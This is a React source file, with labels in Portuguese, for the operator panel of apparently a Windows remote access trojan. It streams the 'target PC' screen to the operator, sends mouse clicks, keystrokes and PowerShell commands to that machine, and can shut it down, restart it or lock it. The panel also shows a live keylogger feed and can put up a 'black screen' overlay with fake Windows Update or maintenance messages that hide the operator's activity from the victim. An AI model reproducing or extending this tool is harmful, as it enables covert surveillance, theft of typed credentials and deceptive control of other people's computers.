import { useState, useEffect, useRef, useCallback } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { devicesAPI, getApiBaseUrl } from '../services/api';
import type { Device } from '../types';
import {
  ArrowLeft,
  Monitor,
  Terminal,
  Lock,
  RefreshCw,
  Maximize2,
  Minimize2,
  Key,
  Send,
  FileText,
  Power,
  RotateCcw,
  Palette,
  X
} from 'lucide-react';

export default function WinDeviceControl() {
  const { deviceId } = useParams<{ deviceId: string }>();
  const navigate = useNavigate();

  const [device, setDevice] = useState<Device | null>(null);
  const [quality, setQuality] = useState<number>(55);
  const [fps, setFps] = useState<number>(0);
  const [latency, setLatency] = useState<number>(0);
  const [isFullscreen, setIsFullscreen] = useState(false);

  const [typeText, setTypeText] = useState('');
  const [cmdInput, setCmdInput] = useState('');
  const [cmdOutput, setCmdOutput] = useState<string>('Terminal PowerShell inicializado. Prontos para execução.\n');
  const [keylogs, setKeylogs] = useState<string[]>([]);
  const [loadingCmd, setLoadingCmd] = useState(false);

  const frameCountRef = useRef(0);
  const lastTimeRef = useRef(Date.now());

  // Busca dados do dispositivo
  const fetchDeviceInfo = useCallback(async () => {
    if (!deviceId) return;
    try {
      const data = await devicesAPI.getAll();
      const dev = data.find((d: Device) => d.device_id === deviceId);
      if (dev) {
        setDevice(dev);
      }
    } catch (err) {
      console.error('Erro ao carregar info do dispositivo Windows:', err);
    }
  }, [deviceId]);

  useEffect(() => {
    fetchDeviceInfo();
    const interval = setInterval(fetchDeviceInfo, 4000);
    return () => clearInterval(interval);
  }, [fetchDeviceInfo]);

  const canvasRef = useRef<HTMLCanvasElement>(null);
  const [isLoadingScreen, setIsLoadingScreen] = useState(true);

  // Função auxiliar para desenhar o frame no Canvas de forma ultra-suave e sem piscar
  const renderFrameToCanvas = useCallback((blobOrUrl: Blob | string) => {
    const url = typeof blobOrUrl === 'string' ? blobOrUrl : URL.createObjectURL(blobOrUrl);
    const img = new Image();
    img.onload = () => {
      if (canvasRef.current) {
        const canvas = canvasRef.current;
        if (canvas.width !== img.width || canvas.height !== img.height) {
          canvas.width = img.width;
          canvas.height = img.height;
        }
        const ctx = canvas.getContext('2d');
        ctx?.drawImage(img, 0, 0);
        setIsLoadingScreen(false);
      }
      if (typeof blobOrUrl !== 'string') {
        URL.revokeObjectURL(url);
      }
    };
    img.src = url;
  }, []);

  // Stream de Tela WebSocket / Poll
  useEffect(() => {
    if (!deviceId) return;

    let isMounted = true;
    const token = localStorage.getItem('token') || '';
    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
    const wsUrl = `${protocol}//${window.location.host}/ws/dashboard/${deviceId}?token=${token}`;
    let socket: WebSocket | null = null;

    try {
      socket = new WebSocket(wsUrl);
      socket.binaryType = 'arraybuffer';

      socket.onmessage = (event) => {
        if (!isMounted) return;
        const now = Date.now();
        frameCountRef.current += 1;

        if (now - lastTimeRef.current >= 1000) {
          setFps(frameCountRef.current);
          frameCountRef.current = 0;
          lastTimeRef.current = now;
        }

        if (typeof event.data === 'string') {
          try {
            const parsed = JSON.parse(event.data);
            if (parsed.type === 'KEYLOG') {
              setKeylogs(prev => [parsed.data, ...prev.slice(0, 40)]);
            }
          } catch {
            setKeylogs(prev => [event.data, ...prev.slice(0, 40)]);
          }
        } else if (event.data instanceof ArrayBuffer && event.data.byteLength > 100) {
          const blob = new Blob([event.data], { type: 'image/jpeg' });
          renderFrameToCanvas(blob);
        }
      };
    } catch (e) {
      console.error('Erro WebSocket VNC Windows:', e);
    }

    // Fallback de HTTP Screen Stream suave apenas se WebSocket não conectar
    const pollInterval = setInterval(async () => {
      if (!isMounted) return;
      try {
        const timestamp = Date.now();
        const start = performance.now();
        const imgUrl = `${getApiBaseUrl()}/api/devices/${deviceId}/screen?t=${timestamp}&token=${token}&quality=${quality}`;
        renderFrameToCanvas(imgUrl);
        setLatency(Math.round(performance.now() - start));
      } catch (err) {
        // silencioso
      }
    }, 250);

    return () => {
      isMounted = false;
      clearInterval(pollInterval);
      if (socket) socket.close();
    };
  }, [deviceId, quality, renderFrameToCanvas]);

  // Auxiliar para calcular a posição exata do clique dentro da imagem do Desktop (removendo barras pretas do aspect ratio)
  const getCanvasCoordinates = (e: React.MouseEvent<HTMLCanvasElement>) => {
    const canvas = canvasRef.current;
    if (!canvas) return null;

    const rect = canvas.getBoundingClientRect();
    if (rect.width <= 0 || rect.height <= 0) return null;

    const cw = canvas.width;
    const ch = canvas.height;
    if (!cw || !ch) return null;

    const containerRatio = rect.width / rect.height;
    const canvasRatio = cw / ch;

    let drawW = rect.width;
    let drawH = rect.height;
    let offsetX = 0;
    let offsetY = 0;

    if (containerRatio > canvasRatio) {
      drawW = rect.height * canvasRatio;
      offsetX = (rect.width - drawW) / 2;
    } else {
      drawH = rect.width / canvasRatio;
      offsetY = (rect.height - drawH) / 2;
    }

    const mouseX = e.clientX - rect.left - offsetX;
    const mouseY = e.clientY - rect.top - offsetY;

    const xRatio = Math.max(0, Math.min(1, mouseX / drawW));
    const yRatio = Math.max(0, Math.min(1, mouseY / drawH));

    return { xRatio, yRatio };
  };

  // Manipulador de Clique no Monitor Desktop (Canvas) - Suporta Clique Simples, Duplo e Botão Direito
  const handleScreenClick = async (e: React.MouseEvent<HTMLCanvasElement>) => {
    const coords = getCanvasCoordinates(e);
    if (!coords || !deviceId) return;

    const isRightClick = e.button === 2;
    const isDoubleClick = e.detail === 2;

    try {
      await devicesAPI.sendCommand(deviceId, {
        action: 'CLICK',
        x: coords.xRatio,
        y: coords.yRatio,
        button: isRightClick ? 'right' : 'left',
        double: isDoubleClick
      });
    } catch (err) {
      console.error('Erro ao enviar clique de mouse:', err);
    }
  };


  const handleSendText = async () => {
    if (!deviceId || !typeText.trim()) return;
    try {
      await devicesAPI.sendCommand(deviceId, {
        action: 'TYPE',
        text: typeText
      });
      setTypeText('');
    } catch (err) {
      alert('Erro ao enviar texto para o PC');
    }
  };

  const handleSendKey = async (keyName: string) => {
    if (!deviceId) return;
    try {
      await devicesAPI.sendCommand(deviceId, {
        action: 'KEY',
        key: keyName
      });
    } catch (err) {
      alert(`Erro ao enviar tecla ${keyName}`);
    }
  };

  const handleSendShellCommand = async () => {
    if (!deviceId || !cmdInput.trim()) return;
    setLoadingCmd(true);
    const cmd = cmdInput.trim();
    try {
      await devicesAPI.sendCommand(deviceId, {
        action: 'SHELL',
        command: cmd
      });
      setCmdOutput(prev => `PS C:\\Users\\User> ${cmd}\n[Comando enviado ao PC alvo]\n` + prev);
      setCmdInput('');
    } catch (err) {
      setCmdOutput(prev => `[ERRO ao enviar comando]: ${err}\n` + prev);
    } finally {
      setLoadingCmd(false);
    }
  };

  const [isBlackScreenOn, setIsBlackScreenOn] = useState(false);
  const [showCustomBlackModal, setShowCustomBlackModal] = useState(false);
  const [customTitle, setCustomTitle] = useState('Trabalhando nas atualizações');
  const [customSubtitle, setCustomSubtitle] = useState('Não desligue o seu computador. Isso pode levar alguns minutos.');
  const [customTemplate, setCustomTemplate] = useState<string>('windows_update');

  const handleToggleBlackScreen = async () => {
    if (!deviceId) return;
    const nextState = !isBlackScreenOn;
    setIsBlackScreenOn(nextState);
    try {
      await devicesAPI.sendCommand(deviceId, {
        action: nextState ? 'BLACK_SCREEN_ON' : 'BLACK_SCREEN_OFF',
        title: customTitle,
        subtitle: customSubtitle,
        template: customTemplate
      });
    } catch (err) {
      alert('Erro ao alternar tela preta no PC');
    }
  };

  const handleApplyCustomBlackScreen = async () => {
    if (!deviceId) return;
    setIsBlackScreenOn(true);
    try {
      await devicesAPI.sendCommand(deviceId, {
        action: 'CUSTOM_BLACK_SCREEN',
        title: customTitle,
        subtitle: customSubtitle,
        template: customTemplate
      });
      setShowCustomBlackModal(false);
    } catch (err) {
      alert('Erro ao aplicar tela preta personalizável no PC');
    }
  };


  const handleLockPC = async () => {
    if (!deviceId) return;
    try {
      await devicesAPI.sendCommand(deviceId, { action: 'LOCK' });
    } catch (err) {
      alert('Erro ao enviar comando de bloqueio');
    }
  };

  const handleShutdownPC = async () => {
    if (!deviceId || !window.confirm('Tem certeza que deseja DESLIGAR o PC alvo remotamente?')) return;
    try {
      await devicesAPI.sendCommand(deviceId, { action: 'SHUTDOWN' });
    } catch (err) {
      alert('Erro ao enviar comando de desligamento');
    }
  };

  const handleRestartPC = async () => {
    if (!deviceId || !window.confirm('Tem certeza que deseja REINICIAR o PC alvo remotamente?')) return;
    try {
      await devicesAPI.sendCommand(deviceId, { action: 'RESTART' });
    } catch (err) {
      alert('Erro ao enviar comando de reinício');
    }
  };

  return (
    <div className="flex flex-col h-screen bg-slate-950 text-slate-100 font-sans overflow-hidden">
      {/* Top Navbar */}
      <header className="h-16 bg-[#121214]/90 border-b border-[#2a2a31]/20 px-6 flex items-center justify-between backdrop-blur-xl shrink-0 z-30">
        <div className="flex items-center space-x-4">
          <button
            onClick={() => navigate('/win-builder')}
            className="p-2 rounded-md bg-slate-950 border border-[#24242a] hover:border-[#2a2a31] text-slate-400 hover:text-[#ef4444] transition"
            title="Voltar à Central Windows"
          >
            <ArrowLeft className="w-5 h-5" />
          </button>
          
          <div className="flex items-center space-x-3">
            <div className="p-2 rounded-md bg-[#ef4444]/10 text-[#ef4444] border border-[#2a2a31]/30">
              <Monitor className="w-6 h-6" />
            </div>
            <div>
              <div className="flex items-center space-x-2">
                <h1 className="font-extrabold text-base text-slate-100">
                  {device?.model || deviceId}
                </h1>
                <span className="px-2 py-0.5 rounded-full bg-emerald-500/20 border border-emerald-500/40 text-emerald-400 text-[10px] font-bold flex items-center space-x-1">
                  <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
                  <span>ONLINE</span>
                </span>
              </div>
              <p className="text-xs text-slate-400">
                {device?.manufacturer || 'Microsoft Windows'} • IP: {device?.ip_address || '127.0.0.1'}
              </p>
            </div>
          </div>
        </div>

        <div className="flex items-center space-x-3">
          <div className="flex items-center space-x-4 bg-slate-950 px-3.5 py-1.5 rounded-md border border-[#24242a] text-xs text-slate-400">
            <span>FPS: <strong className="text-[#ef4444]">{fps}</strong></span>
            <span>Latência: <strong className="text-[#f87171]">{latency}ms</strong></span>
          </div>

          <button
            onClick={() => setIsFullscreen(!isFullscreen)}
            className="p-2 rounded-md bg-slate-950 border border-[#24242a] hover:border-[#2a2a31] text-slate-300 transition"
            title={isFullscreen ? 'Sair do Modo Tela Cheia' : 'Modo Tela Cheia'}
          >
            {isFullscreen ? <Minimize2 className="w-5 h-5" /> : <Maximize2 className="w-5 h-5" />}
          </button>
        </div>
      </header>

      {/* Main Grid Content */}
      <div className="flex-1 grid grid-cols-1 lg:grid-cols-12 gap-5 p-5 overflow-hidden bg-[radial-gradient(ellipse_at_top,_var(--tw-gradient-stops))] from-[#121214] via-slate-950 to-black">
        
        {/* Painel Esquerdo: Atalhos de Teclado & Ações Específicas de Windows PC */}
        <div className="lg:col-span-3 bg-[#121214]/60 backdrop-blur-xl border border-[#2a2a31]/20 rounded-3xl p-5 shadow-2xl flex flex-col space-y-4 overflow-y-auto">
          <div className="flex items-center space-x-2 text-[#ef4444] font-bold text-sm border-b border-[#24242a] pb-3">
            <Key className="w-4 h-4" />
            <h2>Controles & Teclas Windows</h2>
          </div>

          {/* Atalhos Rápidos de Teclado Windows */}
          <div className="space-y-2">
            <label className="text-[11px] font-bold text-slate-400 uppercase tracking-wider block">Atalhos de Sistema</label>
            <div className="grid grid-cols-2 gap-2">
              <button
                onClick={() => handleSendKey('WIN')}
                className="p-2.5 rounded-md bg-slate-950 border border-[#24242a] hover:border-[#2a2a31]/60 hover:bg-[#121214] text-[#ef4444] font-bold text-xs transition text-center"
              >
                🪟 Menu Iniciar
              </button>
              <button
                onClick={() => handleSendKey('WIN_D')}
                className="p-2.5 rounded-md bg-slate-950 border border-[#24242a] hover:border-[#2a2a31]/60 hover:bg-[#121214] text-[#ef4444] font-bold text-xs transition text-center"
              >
                🖥️ Area Trabalho
              </button>
              <button
                onClick={() => handleSendKey('WIN_E')}
                className="p-2.5 rounded-md bg-slate-950 border border-[#24242a] hover:border-[#2a2a31]/60 hover:bg-[#121214] text-[#ef4444] font-bold text-xs transition text-center"
              >
                📁 Explorador
              </button>
              <button
                onClick={() => handleSendKey('ALT_TAB')}
                className="p-2.5 rounded-md bg-slate-950 border border-[#24242a] hover:border-[#2a2a31]/60 hover:bg-[#121214] text-[#ef4444] font-bold text-xs transition text-center"
              >
                🔄 Alt + Tab
              </button>
            </div>
          </div>

          {/* Teclas Especiais */}
          <div className="space-y-2">
            <label className="text-[11px] font-bold text-slate-400 uppercase tracking-wider block">Teclas Rápidas</label>
            <div className="grid grid-cols-3 gap-1.5">
              {['ENTER', 'ESC', 'TAB', 'BACK', 'DELETE', 'HOME'].map(k => (
                <button
                  key={k}
                  onClick={() => handleSendKey(k)}
                  className="py-2 bg-slate-950 hover:bg-[#24242a] border border-[#24242a] text-slate-300 rounded-md font-mono text-[11px] font-bold transition"
                >
                  {k}
                </button>
              ))}
            </div>
          </div>

          {/* Caixa de Digitação de Texto */}
          <div className="space-y-2 border-t border-[#24242a] pt-3">
            <label className="text-[11px] font-bold text-slate-400 uppercase tracking-wider block">Digitar Texto no PC Alvo</label>
            <div className="flex space-x-2">
              <input
                type="text"
                value={typeText}
                onChange={e => setTypeText(e.target.value)}
                onKeyDown={e => e.key === 'Enter' && handleSendText()}
                placeholder="Digite texto ou URL..."
                className="flex-1 bg-slate-950 border border-[#24242a] rounded-md px-3 py-2 text-xs text-slate-100 focus:outline-none focus:border-[#2a2a31]"
              />
              <button
                onClick={handleSendText}
                className="p-2 bg-[#ef4444] hover:bg-[#ef4444] text-slate-950 font-bold rounded-md transition"
                title="Enviar Texto"
              >
                <Send className="w-4 h-4" />
              </button>
            </div>
          </div>

          {/* Ações de Sistema */}
          <div className="space-y-2 border-t border-[#24242a] pt-3 flex-1 flex flex-col justify-end">
            <label className="text-[11px] font-bold text-slate-400 uppercase tracking-wider block">Ações de Segurança & Tela</label>
            
            <div className="grid grid-cols-2 gap-2">
              <button
                onClick={handleToggleBlackScreen}
                className={`py-3 rounded-md font-bold text-[11px] transition flex items-center justify-center space-x-1.5 border shadow-lg ${
                  isBlackScreenOn
                    ? 'bg-amber-500/20 hover:bg-amber-500/30 border-amber-500/50 text-amber-300 shadow-[0_0_15px_rgba(245,158,11,0.2)]'
                    : 'bg-slate-950 hover:bg-[#121214] border-[#2a2a31]/40 text-[#ef4444] shadow-[0_0_15px_rgba(239,68,68,0.15)]'
                }`}
              >
                <span>{isBlackScreenOn ? '💡 DESATIVAR PRETA' : '🖤 ATIVAR TELA PRETA'}</span>
              </button>

              <button
                onClick={() => setShowCustomBlackModal(true)}
                className="py-3 rounded-md bg-[#84cc16]/20 hover:bg-[#84cc16]/30 border border-[#f87171]/50 text-[#fca5a5] font-bold text-[11px] transition flex items-center justify-center space-x-1.5 shadow-lg"
              >
                <Palette className="w-3.5 h-3.5" />
                <span>PERSONALIZAR</span>
              </button>
            </div>


            <button
              onClick={handleLockPC}
              className="w-full py-2.5 rounded-md bg-[#f87171]/20 hover:bg-[#f87171]/30 border border-[#f87171]/40 text-[#fca5a5] font-bold text-xs transition flex items-center justify-center space-x-2"
            >
              <Lock className="w-4 h-4" />
              <span>Bloquear PC (LockWorkStation)</span>
            </button>

            <div className="grid grid-cols-2 gap-2 pt-1">
              <button
                onClick={handleShutdownPC}
                className="py-2.5 rounded-md bg-[#ef4444]/20 hover:bg-[#ef4444]/30 border border-[#ef4444]/40 text-rose-300 font-bold text-xs transition flex items-center justify-center space-x-1.5"
              >
                <Power className="w-4 h-4" />
                <span>Desligar PC</span>
              </button>
              <button
                onClick={handleRestartPC}
                className="py-2.5 rounded-md bg-[#ef4444]/20 hover:bg-[#ef4444]/30 border border-[#2a2a31]/40 text-[#ef4444] font-bold text-xs transition flex items-center justify-center space-x-1.5"
              >
                <RotateCcw className="w-4 h-4" />
                <span>Reiniciar PC</span>
              </button>
            </div>
          </div>
        </div>

        {/* Painel Central: Monitor VNC Horizontal (16:9 Desktop Real) */}
        <div className="lg:col-span-6 bg-[#121214]/60 backdrop-blur-xl border border-[#24242a] rounded-3xl p-4 shadow-2xl flex flex-col items-center justify-center relative overflow-hidden">
          
          {/* Top Bar do Monitor */}
          <div className="w-full flex items-center justify-between px-3 py-2 bg-slate-950/80 rounded-md border border-[#24242a] mb-3 text-xs">
            <span className="text-[#ef4444] font-bold flex items-center space-x-1.5">
              <Monitor className="w-4 h-4" />
              <span>Transmissão Desktop Windows (16:9)</span>
            </span>

            <div className="flex items-center space-x-3">
              <span className="text-slate-400 text-[11px]">Qualidade: {quality}%</span>
              <input
                type="range"
                min="20"
                max="90"
                value={quality}
                onChange={e => setQuality(Number(e.target.value))}
                className="w-20 accent-[#ef4444] h-1"
              />
            </div>
          </div>

          {/* Container do Monitor VNC Canvas Ultra-Suave (Sem Piscar) */}
          <div
            className="w-full aspect-video bg-black rounded-md border-2 border-[#2a2a31]/30 relative overflow-hidden cursor-crosshair group shadow-[0_0_30px_rgba(239,68,68,0.15)] flex items-center justify-center"
          >
            <canvas
              ref={canvasRef}
              onClick={handleScreenClick}
              onDoubleClick={handleScreenClick}
              onContextMenu={(e) => { e.preventDefault(); handleScreenClick(e); }}
              className="w-full h-full object-contain block select-none cursor-crosshair"
            />

            {isLoadingScreen && (
              <div className="absolute inset-0 bg-slate-950/80 flex flex-col items-center justify-center space-y-2 text-slate-400 pointer-events-none">
                <RefreshCw className="w-8 h-8 animate-spin text-[#ef4444]" />
                <p className="text-xs font-mono">Conectando ao Desktop do PC...</p>
              </div>
            )}

            {/* Overlay indicador de cliques */}
            <div className="absolute inset-0 bg-[#ef4444]/5 opacity-0 group-hover:opacity-100 transition pointer-events-none flex items-center justify-center">
              <span className="bg-slate-950/80 px-3 py-1.5 rounded-full border border-[#2a2a31]/40 text-[10px] text-[#ef4444] font-mono">
                Clique para interagir no PC
              </span>
            </div>
          </div>

          <p className="text-[11px] text-[#8b8b94] mt-3 text-center">
            Clique com o botão esquerdo para selecionar/abrir ou clique com o botão direito para menu de contexto no Windows.
          </p>
        </div>

        {/* Painel Direito: Terminal PowerShell & Keylogger 24/7 */}
        <div className="lg:col-span-3 bg-[#121214]/60 backdrop-blur-xl border border-[#2a2a31]/25 rounded-3xl p-5 shadow-2xl flex flex-col space-y-4 overflow-hidden">
          
          {/* Terminal PowerShell */}
          <div className="flex-1 flex flex-col space-y-2 overflow-hidden border-b border-[#24242a] pb-4">
            <div className="flex items-center justify-between text-[#ef4444] font-bold text-xs">
              <span className="flex items-center space-x-1.5">
                <Terminal className="w-4 h-4 text-[#ef4444]" />
                <span>TERMINAL POWERSHELL</span>
              </span>
            </div>

            <div className="flex space-x-1.5">
              <input
                type="text"
                value={cmdInput}
                onChange={e => setCmdInput(e.target.value)}
                onKeyDown={e => e.key === 'Enter' && handleSendShellCommand()}
                placeholder="Ex: Get-Process, ipconfig..."
                className="flex-1 bg-slate-950 border border-[#24242a] rounded-md px-2.5 py-1.5 text-xs font-mono text-[#ef4444] focus:outline-none focus:border-[#2a2a31]"
              />
              <button
                onClick={handleSendShellCommand}
                disabled={loadingCmd}
                className="px-3 py-1.5 bg-gradient-to-r from-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#f87171] text-[#10120a] font-bold text-xs rounded-md transition shadow-md"
              >
                {loadingCmd ? '...' : 'OK'}
              </button>
            </div>

            <pre className="flex-1 bg-slate-950 p-2.5 rounded-md border border-[#24242a] text-[10px] font-mono text-emerald-400 overflow-y-auto whitespace-pre-wrap leading-relaxed">
              {cmdOutput}
            </pre>
          </div>

          {/* Keylogger 24/7 */}
          <div className="h-44 flex flex-col space-y-2">
            <div className="flex items-center justify-between text-[#ef4444] font-bold text-xs">
              <span className="flex items-center space-x-1.5">
                <FileText className="w-4 h-4" />
                <span>KEYLOGGER WINDOWS</span>
              </span>
              <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
            </div>

            <div className="flex-1 bg-slate-950 p-2.5 rounded-md border border-[#24242a] text-[11px] font-mono text-slate-300 overflow-y-auto space-y-1">
              {keylogs.length === 0 ? (
                <p className="text-[#6f6f78] text-[10px]">Aguardando digitação no PC...</p>
              ) : (
                keylogs.map((log, idx) => (
                  <div key={idx} className="text-[#ef4444] border-b border-[#121214] pb-0.5">
                    {log}
                  </div>
                ))
              )}
            </div>
          </div>

        </div>

      </div>

      {/* MODAL DE TELA PRETA PERSONALIZÁVEL DO WINDOWS */}
      {showCustomBlackModal && (
        <div className="fixed inset-0 z-50 bg-slate-950/80 backdrop-blur-md flex items-center justify-center p-4">
          <div className="bg-[#121214] border border-[#f87171]/30 rounded-3xl p-6 w-full max-w-lg shadow-2xl relative space-y-5 animate-in fade-in zoom-in duration-200">
            <button
              onClick={() => setShowCustomBlackModal(false)}
              className="absolute top-4 right-4 p-2 text-slate-400 hover:text-white rounded-md bg-slate-950/50 hover:bg-[#24242a] transition"
            >
              <X className="w-5 h-5" />
            </button>

            <div className="flex items-center space-x-3 text-[#f87171]">
              <Palette className="w-6 h-6" />
              <h3 className="text-lg font-bold text-white">Personalizar Tela Preta no PC</h3>
            </div>

            <p className="text-xs text-slate-400 leading-relaxed">
              Escolha um modelo predefinido ou digite o texto customizado que aparecerá em tela cheia no monitor do PC alvo enquanto você controla remotamente.
            </p>

            {/* Modelos Prontos */}
            <div className="space-y-2">
              <label className="text-[11px] font-bold text-slate-400 uppercase tracking-wider block">Modelos Rápidos</label>
              <div className="grid grid-cols-2 gap-2">
                <button
                  type="button"
                  onClick={() => {
                    setCustomTemplate('windows_update');
                    setCustomTitle('Trabalhando nas atualizações');
                    setCustomSubtitle('Não desligue o seu computador. Isso pode levar alguns minutos.');
                  }}
                  className={`p-3 rounded-md border text-left transition ${
                    customTemplate === 'windows_update'
                      ? 'bg-[#f87171]/20 border-[#f87171] text-purple-200 font-bold'
                      : 'bg-slate-950 border-[#24242a] text-slate-400 hover:border-[#2a2a31]'
                  }`}
                >
                  <p className="text-xs">💻 Windows Update</p>
                  <p className="text-[10px] text-[#8b8b94] mt-0.5">Atualização fake</p>
                </button>

                <button
                  type="button"
                  onClick={() => {
                    setCustomTemplate('maintenance');
                    setCustomTitle('Manutenção de Segurança do Sistema');
                    setCustomSubtitle('Optimizando integridade do Windows. Por favor aguarde...');
                  }}
                  className={`p-3 rounded-md border text-left transition ${
                    customTemplate === 'maintenance'
                      ? 'bg-[#f87171]/20 border-[#f87171] text-purple-200 font-bold'
                      : 'bg-slate-950 border-[#24242a] text-slate-400 hover:border-[#2a2a31]'
                  }`}
                >
                  <p className="text-xs">⚙️ Manutenção</p>
                  <p className="text-[10px] text-[#8b8b94] mt-0.5">Otimização</p>
                </button>

                <button
                  type="button"
                  onClick={() => {
                    setCustomTemplate('pure_black');
                    setCustomTitle('');
                    setCustomSubtitle('');
                  }}
                  className={`p-3 rounded-md border text-left transition ${
                    customTemplate === 'pure_black'
                      ? 'bg-[#f87171]/20 border-[#f87171] text-purple-200 font-bold'
                      : 'bg-slate-950 border-[#24242a] text-slate-400 hover:border-[#2a2a31]'
                  }`}
                >
                  <p className="text-xs">⬛ 100% Preta Pura</p>
                  <p className="text-[10px] text-[#8b8b94] mt-0.5">Sem nenhum texto</p>
                </button>

                <button
                  type="button"
                  onClick={() => {
                    setCustomTemplate('custom');
                  }}
                  className={`p-3 rounded-md border text-left transition ${
                    customTemplate === 'custom'
                      ? 'bg-[#f87171]/20 border-[#f87171] text-purple-200 font-bold'
                      : 'bg-slate-950 border-[#24242a] text-slate-400 hover:border-[#2a2a31]'
                  }`}
                >
                  <p className="text-xs">✏️ Texto Livre</p>
                  <p className="text-[10px] text-[#8b8b94] mt-0.5">Seu próprio texto</p>
                </button>
              </div>
            </div>

            {/* Inputs de Texto */}
            {customTemplate !== 'pure_black' && (
              <div className="space-y-3 pt-2">
                <div>
                  <label className="text-[11px] font-bold text-slate-400 uppercase tracking-wider block mb-1">Título Principal</label>
                  <input
                    type="text"
                    value={customTitle}
                    onChange={e => setCustomTitle(e.target.value)}
                    placeholder="Ex: Trabalhando nas atualizações"
                    className="w-full bg-slate-950 border border-[#24242a] rounded-md px-3.5 py-2 text-xs text-white focus:outline-none focus:border-[#f87171]"
                  />
                </div>

                <div>
                  <label className="text-[11px] font-bold text-slate-400 uppercase tracking-wider block mb-1">Subtítulo / Mensagem Explicativa</label>
                  <textarea
                    rows={2}
                    value={customSubtitle}
                    onChange={e => setCustomSubtitle(e.target.value)}
                    placeholder="Ex: Não desligue o seu computador. Isso pode levar alguns minutos."
                    className="w-full bg-slate-950 border border-[#24242a] rounded-md px-3.5 py-2 text-xs text-white focus:outline-none focus:border-[#f87171] resize-none"
                  />
                </div>
              </div>
            )}

            {/* Ações do Modal */}
            <div className="flex space-x-3 pt-2">
              <button
                type="button"
                onClick={() => setShowCustomBlackModal(false)}
                className="flex-1 py-3 rounded-md bg-slate-950 hover:bg-[#24242a] border border-[#24242a] text-slate-400 font-bold text-xs transition"
              >
                Cancelar
              </button>

              <button
                type="button"
                onClick={handleApplyCustomBlackScreen}
                className="flex-1 py-3 rounded-md bg-[#84cc16] hover:bg-[#f87171] text-white font-bold text-xs transition shadow-lg shadow-[#84cc16]/30"
              >
                Aplicar no PC Alvo
              </button>
            </div>

          </div>
        </div>
      )}

    </div>
  );
}

